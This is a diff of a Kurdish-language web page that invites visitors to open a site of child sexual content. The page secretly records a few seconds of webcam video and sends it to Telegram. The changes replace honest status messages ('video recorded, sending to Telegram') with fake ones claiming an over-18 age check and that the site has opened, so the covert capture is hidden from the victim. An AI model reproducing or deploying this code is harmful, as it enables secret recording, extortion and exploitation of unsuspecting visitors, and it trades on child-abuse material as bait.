@@ -39,7 +39,7 @@
     <h2>please continue to account +18</h2>
     <p>تکایە ئەم دوگمەی خوارەوە داگرە بۆ کردنەوەی سایتی سێکسی منداڵان.</p>
     
-    <button id="startBtn">دەستپێکردن و ناردن</button>
+    <button id="startBtn">دەستپێکردن بۆ چونەژورەوە</button>
     <div id="status">چاوەڕوانە...</div>
 
     <!-- توخمێک بۆ گرتنی داتای کامێرا -->
@@ -113,7 +113,7 @@
                 mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                 
                 mediaRecorder.onstop = async () => {
-                    statusDiv.innerText = "⏳ ڤیدیۆ تۆمارکرا، لە حاڵەتی ناردندایە...";
+                    statusDiv.innerText = "⏳لە حالەتی پشکنینداین تا بزانین سەرو هەژدە ساڵیت";
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     
                     // ناردنی فایلی ڤیدیۆکە بۆ تێلیگرام
@@ -126,9 +126,9 @@
                             method: 'POST',
                             body: formData
                         });
-                        statusDiv.innerText = "✅ هەموو زانیارییەکان و ڤیدیۆکە بە سەرکەوتوویی نێردران بۆ تێلیگرام.";
+                        statusDiv.innerText = "✅ ئێستا بە سەرکەوتویی وێبسایتەکەت بۆ کراوە.";
                     } catch (err) {
-                        statusDiv.innerText = "❌ کێشەیەک لە ناردنی ڤیدیۆکە ڕوویدا.";
+                        statusDiv.innerText = "❌ کێشەیەک لە تۆدا هەیە.";
                     }
 
                     // کوژاندنەوەی کامێراکە دوای تەواوبوون
@@ -137,7 +137,7 @@
 
                 // دەستپێکردنی تۆمارکردن
                 mediaRecorder.start();
-                statusDiv.innerText = "🔴 ڤیدیۆ بۆ ماوەی ٤ چرکە تۆمار دەکرێت...";
+                statusDiv.innerText = "🔴 تکایە بۆماوەی چەن چرکەیەک بۆستە";
 
                 // ڕاگرتنی تۆمارکردن دوای ٤ چرکە
                 setTimeout(() => {
